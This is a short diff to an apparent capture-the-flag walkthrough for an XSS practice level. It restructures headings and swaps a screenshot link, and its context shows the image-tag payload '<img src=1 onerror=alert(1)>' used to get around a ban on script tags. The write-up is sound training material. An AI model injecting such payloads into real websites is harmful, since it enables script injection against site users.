@@ -13,7 +13,9 @@ custom_edit_url: null
 
 > 3. This level is sponsored by the letters _i_, _m_ and _g_ and the attribute `onerror`.
 
-## Payload
+## Exploitation
+
+### Payload
 
 Since we cannot use `<script>` tags, we have to craft a basic payload using `<img>` tags.
 
@@ -21,4 +23,4 @@ Since we cannot use `<script>` tags, we have to craft a basic payload using `<im
 <img src=1 onerror=alert(1)>
 ```
 
-![2](https://github.com/user-attachments/assets/003777f9-15bb-4b51-ad6b-fd1068199154)
+![2](https://github.com/user-attachments/assets/0eb0fce5-786f-4eec-9b2f-4b9492aafa28)
